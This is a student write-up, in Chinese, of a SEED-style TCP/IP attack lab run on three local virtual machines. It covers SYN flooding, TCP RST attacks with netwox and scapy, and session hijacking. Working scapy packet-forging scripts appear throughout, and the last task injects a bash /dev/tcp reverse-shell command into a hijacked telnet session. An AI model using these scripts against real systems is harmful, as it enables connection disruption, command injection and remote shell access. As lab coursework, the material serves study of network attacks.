# TCP/IP Attack Lab



## Lab Environment

配置网络，三台虚拟机在同一内网段下

`client(seedubuntu2)`(`192.168.2.191`)

```shell
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
    link/ether 00:0c:29:d9:49:cc brd ff:ff:ff:ff:ff:ff
    inet 192.168.2.191/24 brd 192.168.2.255 scope global dynamic ens33
       valid_lft 1708sec preferred_lft 1708sec
    inet6 fe80::f582:3390:83a2:3e20/64 scope link 
       valid_lft forever preferred_lft forever
```

`server(seedubuntu)`(`192.168.2.189`)

```shell
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
    link/ether 00:0c:29:7a:5d:47 brd ff:ff:ff:ff:ff:ff
    inet 192.168.2.189/24 brd 192.168.2.255 scope global dynamic ens33
       valid_lft 1693sec preferred_lft 1693sec
    inet6 fe80::9688:b76f:c987:76b1/64 scope link 
       valid_lft forever preferred_lft forever
```

`attacker(kali linux)`(`192.168.2.178`)

```shell
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:66:7c:40 brd ff:ff:ff:ff:ff:ff
    inet 192.168.2.178/24 brd 192.168.2.255 scope global dynamic noprefixroute eth0
       valid_lft 1597sec preferred_lft 1597sec
    inet6 fe80::20c:29ff:fe66:7c40/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```



## Lab Tasks

### Task 1: SYN Flooding Attack

攻击发生前，`client`能够通过`telnet`连接到`server`

![image-20201108102554123](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108102554123.png)

首先关闭掉`server`的防御措施`syncookies`

![image-20201108102815992](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108102815992.png)

此时处于半连接状态的有，没有处于`syn_recv`状态的连接

![image-20201108102917556](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108102917556.png)

在`attacker`上使用

![image-20201108103150337](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108103150337.png)

开始攻击后，看到`server`的半连接状态

![image-20201108103231548](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108103231548.png)

`wireshark`捕获的流量包

![image-20201108104015091](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108104015091.png)

存在大量的请求包，但是没有完成`TCP三次握手`

此时，`client`已经连接不上`server`

![image-20201108103327122](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108103327122.png)



#### 关于`syn_cookie`

[参考资料](https://blog.csdn.net/zhangskd/article/details/16986931)

`SYN Cookie`是对**TCP服务器端的三次握手做一些修改**，专门用来防范`SYN Flood`攻击的一种手段。

它的原理是，在TCP服务器接收到`TCP SYN`包并返回`TCP SYN + ACK`包时，**不分配一个专门的数据区**，而是根据这个`SYN`包计算出一个`cookie`值。这个`cookie`作为将要返回的`SYN ACK`包的初始序列号。当客户端返回一个`ACK`包时，根据包头信息计算`cookie`，与返回的确认序列号(初始序列号 + 1)进行对比，如果相同，则是一个正常连接，然后，分配资源，建立连接。



### Task 2: TCP RST Attacks on telnet and ssh Connections

#### use netwox

- `telnet`

	首先在`client`建立与`server`的`telnet`连接

	![image-20201108104323728](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108104323728.png)

	在`attacker`中启动攻击

	![image-20201108104623147](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108104623147.png)

	在`client`段发现`telnet`连接直接中断

	![image-20201108104700099](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108104700099.png)

	期间`server`捕获的流量包为

	![image-20201108104853568](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108104853568.png)

	可以观察到，在发送了`telnet data`之后

	`attacker`伪造自己是`client`向`server`发送一个tcp断开的包(`8号流量包`)，并且断开了`tcp会话`

- `ssh`

	首先建立`ssh`连接

	![image-20201108105413392](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108105413392.png)

	在`attacker`中启动攻击

	![image-20201108105503437](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108105503437.png)

	`client`发送数据时，直接中断

	![image-20201108105457258](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108105457258.png)

	流量包和`telnet`的情形类似

	![image-20201108105550832](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108105550832.png)



#### use scapy

首先建立`telnet`会话

![image-20201108133254310](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108133254310.png)

在`server`抓捕流量包，查看一下`seq`和`port`

![image-20201108133342287](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108133342287.png)

在`attack`运行如下代码

```python
from scapy.all import *

ip = IP(src="192.168.2.191", dst="192.168.2.189")
flag = 'R'
seq = 197594975
ack = 0
tcp = TCP(sport=42602, dport=23, seq=seq, flags=flag, ack=ack)

pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)
```

运行之后，`client`和`server`之间的会话终止

![image-20201108133432516](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108133432516.png)

抓到的流量包

![image-20201108133448221](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108133448221.png)

`ssh`同理，修改端口号和`seq`即可



### Task 3: TCP RST Attacks on Video Streaming Applications

由于`seedubuntu`无法打开视频（没有`flash`插件），所以使用`attacker`同时作为攻击机和受害机

在`attacker`上，访问`www.bilibili.com`并随便打开一个`视频/直播`

正常播放时，运行`sudo netwox 78 --ips 192.168.2.178`，观察到界面处于缓冲阶段，此时的`tcp`通信已经被切断

![image-20201108135431012](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108135431012.png)

![image-20201108135558070](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108135558070.png)



### Task 4: TCP Session Hijacking

#### `use telnet`

首先，建立`client`与`server`的`telnet`通信

![image-20201108135711625](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108135711625.png)

捕获到的流量包

![image-20201108135818392](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108135818392.png)

拿到`ip port seq ack`

然后使用`netwox 40`进行`tcp`会话劫持

`sudo netwox 40 --ip4-src 192.168.2.191 --ip4-dst 192.168.2.189 --ip4-ttl 2 --tcp-src 43914 --tcp-dst 23 --tcp-seqnum 1465897838 --tcp-window 237 --tcp-acknum 3184009102 --tcp-ack --tcp-data "69640d0a"`

指令的内容是`id`发送之后

![image-20201108143123688](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108143123688.png)

响应包

![image-20201108143140690](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108143140690.png)

确实执行了命令

#### `use scapy`

操作差不多

```python
from scapy.all import *

ip = IP(src="192.168.2.191", dst="192.168.2.189")
tcp = TCP(sport=43920, dport=23, flags=0x010, seq=995168334, ack=956698426)
data = "id\x0d\x0a"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)

```



![image-20201108143735481](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108143735481.png)

![image-20201108143839689](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108143839689.png)



### Task 5: Creating Reverse Shell using TCP Session Hijacking

把指令改一下就行

```python
from scapy.all import *

ip = IP(src="192.168.2.191", dst="192.168.2.189")
tcp = TCP(sport=43926, dport=23, flags=0x010, seq=2427222396, ack=143193915)
data = "bash -i >& /dev/tcp/192.168.2.178/8848 0>&1\x0d\x0a"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)
```



![image-20201108144656850](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108144656850.png)

得到了shell

![image-20201108144707642](https://gitee.com/ethustdout/pics/raw/master/img/image-20201108144707642.png)